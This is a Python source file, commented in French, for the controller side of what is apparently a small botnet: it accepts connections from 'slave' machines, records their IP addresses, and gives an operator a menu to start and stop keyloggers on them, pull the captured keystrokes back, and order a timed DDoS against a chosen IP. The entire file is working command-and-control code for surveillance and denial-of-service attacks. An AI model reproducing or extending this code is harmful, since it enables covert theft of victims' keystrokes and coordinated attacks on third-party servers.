#importation du module socket afin de permetttre une communication réseau
#importation  d'argparse afin de pouvoir créer des argument
#importation de threading, afin d'allouer des processus à différentes action
#importation de time afin de créer des pauses lors de certaines action
import socket as modSocket
import argparse
import threading
import time

lock = threading.Lock()


"""
creation de l'objet Connexion, composé de 9 champs et 2 méthodes

1ère methode : elle va permettre d'écouter sur un port donné, et enregistrera les ip des machines connecté pendant l'écoute
dans un fichier "ListeIP.txt", une fois terminé elle vas faire appelle à la méthode receive situé dans le même objet.

2ème methode : elle va permettre de se connecter à plusieurs machines, grace à leur ip enregistrés dans le fichier "ListeIP.txt"
une fois terminer elle va lancer l'interface choix, qui vas nous affciher les menus des actions.

Ces 2 méthodes sont allouer à un processus chacun

"""

class Connexion():
    def __init__(self, adresse_machine, carte_reseau, liste_ip, port, fichier, chemin, ip, date, clients, nb_line):
        self.__adresse_machine = adresse_machine
        self.__carte_reseau = carte_reseau
        self._liste_ip = liste_ip
        self.__port = port
        self.fichier = fichier
        self.chemin = chemin
        self.ip = ip
        self.date = date
        self.clients = clients
        self.nb_line = nb_line

    def listen(self, carte_reseau, port, fichier, clients, date, nb_line):
        carte_reseau.bind(("", port))
        carte_reseau.listen()
        while True:
            print("Attente de connexion")
            conn_reseau, addr = carte_reseau.accept()
            print(conn_reseau.recv(1024).decode("utf-8"))
            liste_ip.append(addr[0])
            clients.append(conn_reseau)
            i = 0
            print(liste_ip)
            print ("L'IP du slave est : ", liste_ip[i])
            i+=1
            fichier.write(str(liste_ip))       
            fichier.seek(0)
            time.sleep(2)
            essai = threading.Thread(target=objet_choix_action.choix, args=(conn_reseau, ))
            essai.start()

    def choix(self, conn_reseau):
        #petit choix multiple afin de savoir quelle methode on doit lancer
        select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
        while select != 5:
            #on essaie le choix multiple
            try:
                if select == 1:
                    #lance la methode ddos de l'objet choixAction
                    objet_choix_action.ddos(conn_reseau, ip, date)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 2:
                    #lance la methode start de l'objet choixAction
                    objet_choix_action.start_log(liste_ip, conn_reseau)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 3:
                    #lance la methode stop de l'objet choixAction
                    objet_choix_action.stop_log(conn_reseau)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
                elif select == 4:
                    #lance la methode get de l'objet choixAction
                    objet_choix_action.get_log(conn_reseau, chemin, nb_line)
                    #redemande ce que l'on veut faire jusqu'a ce qu'on tape fin
                    select = int(input("1)DDos \n2)Keylogger \n3)stop keylogger \n4)Logger historique \n5)FIN \nSélectionnez une option : "))
            #si la connexion est arretée par le client pendant le choix multiple, il affichera le message ci dessous
            except ConnectionAbortedError:
                print("connexion arretée par le client")
        try:
            for add in clients:
                print("Fin du programme")
                fichier.close()
                carte_reseau.close()
                add.send("FIN".encode("utf-8"))
                pass
        except ConnectionResetError:
            print("un slave c'est déconnecté")

    def start_log(self, liste_ip, conn_reseau):
        print("Choix d'attaque : Keylogger. Signal envoyé")
        #envoie "keylogger" au client
        try:
            for add in self.clients:
                add.send("keylogger".encode("utf-8"))
        except ConnectionResetError:
            print("un slave c'est déconnecté")

    def ddos(self, conn_reseau, ip, date):
        #idem
        print("Choix d'attaque : DDoS. Signal envoyé")
        #demande a l'utilsateur la date pour le ddosa vec un format établi
        #envoie "ddos" au client
        try:
            for add in self.clients: 
                add.send("ddos".encode("utf-8"))
                #envoie ce qui est contenu dans la variable date
                add.send(date.encode("utf-8"))
                #pause de 20 milli seconde
                time.sleep(0.2)
                #et on envoie enfin la variable ip(entré dans l'argparse)
                add.send(ip.encode("utf-8"))
        except ConnectionResetError:
            print("un slave c'est déconnecté")
        

    
    def stop_log(self, conn_reseau):
        print("Choix d'attaque : stop keylogger. Signal envoyé")
        #envoie "stop" au client
        try:
            for add in self.clients: 
                add.send("stop".encode("utf-8"))
                message = add.recv(1024).decode("utf-8")
                if message == "logger arreté":
                    print(message)
                else:
                    print(message)
        except ConnectionResetError:
            print("un slave c'est déconnecté")

    def get_log(self, conn_Reseau, chemin, nb_line):
        print("Choix d'attaque : Logger transfert du logger. Signal envoyé")
        #envoie "transfert" au client 
        i = 0
        try:
            for add in self.clients:
                add.send("transfert".encode("utf-8"))
                #on envoie la variable nbLine
                add.send(nb_line.encode("utf-8"))
                #on ouvre le fichier chemin(variable entré dans l'argparse) que l'on met dans la variable fichier
                log_dir = chemin + "get_log" + str(i) + ".txt"
                print(log_dir)
                fichier_get_log = open(log_dir, "w")
                i+=1
                #on reçoit les infos du keylogger
                message_recu = add.recv(1024).decode("utf-8")
                #on écris ces infos dans la variable fichier
                fichier_get_log.write(message_recu)
                fichier_get_log.close()
        except ConnectionResetError:
           print("un slave c'est déconnecté")

    

#on initie les différents champs présents dans l'objet Connexion
fichier = open("ListeIP.txt", "a")
liste_ip = []
chemin = ""
ip= ""
date = ""
clients = []
port = ""
nb_line = ""
adresse_machine = ("localhost", 5000)
#carte reseau qui va nous servire pour la première méthode de l'objet Connexion
carte_reseau = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
#on assigne l'objet choixAction qui est l'enfant de l'objet Connexion à la variable objetChoixAction
objet_choix_action = Connexion(adresse_machine, carte_reseau, liste_ip, port, fichier, chemin, ip, date, clients, nb_line)

#initiation d'argparse avec les arguments
parser = argparse.ArgumentParser()
#creation de la commande --listen
parser.add_argument("--listen", type=int,
                     help="Ecoute sur un port donné et liste les IP connectées, pour le lancer il faut mettre le n° du port")
#creation de la commande --upload
parser.add_argument("--upload", type=str,
                     help="upload le fichier du keylogger, il faut entrez le chemin du fichier" )
#creation de la commande --ip
parser.add_argument("--ip", type=str,
                     help="envoie des paquets ipv4 sur une adresse donné, pour le lancer suffit de mettre l'ip du serveur a ddos")
parser.add_argument("--conn", type=int,
                     help="se connecte sur un port donné et liste les IP connectées")
#on initie la variable args, qui va contenire les arguments
args = parser.parse_args()

#si --listen est entré on executera ce qui est entrer
if args.listen:
    print(r"""\
        
      _                      _______                      _
   _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
  dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
  V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
           `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
            `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
       __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
     ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
  _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
 <MMP'     `~YMMa_   YOOo   @  OOO  @   oOOP   _adMP~'      `YMM>
              `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
      ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
    ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
   ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
   MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
   YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
    `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
      `'                  `OObNNNNNdOO'                   `'
                            `~OOOOO~'   TISSUE

                """)
    #on entre la variable chemin qui va prendre l'argument entrer lors de la commande --upload
    chemin = args.upload
    print(chemin)
    #on entre la variable ip qui va prendre l'argument entrer lors de la commande --ip
    ip = args.ip
    print(ip)
    #on entre la variable port qui va prendre l'argument entrer lors de la commande --listen
    port = args.listen
    print(port)

    date = input("date pour le ddos, format(yyyy-mm-jj hh:mm) : ")
    nb_line = input("Combien de ligne voulez vous pour le get_log : ")



    #on lance la première methode de l'objet Connexion en lui allouant un thread
    objet_choix_action.listen(carte_reseau, port, fichier, clients, nb_line, date)

    







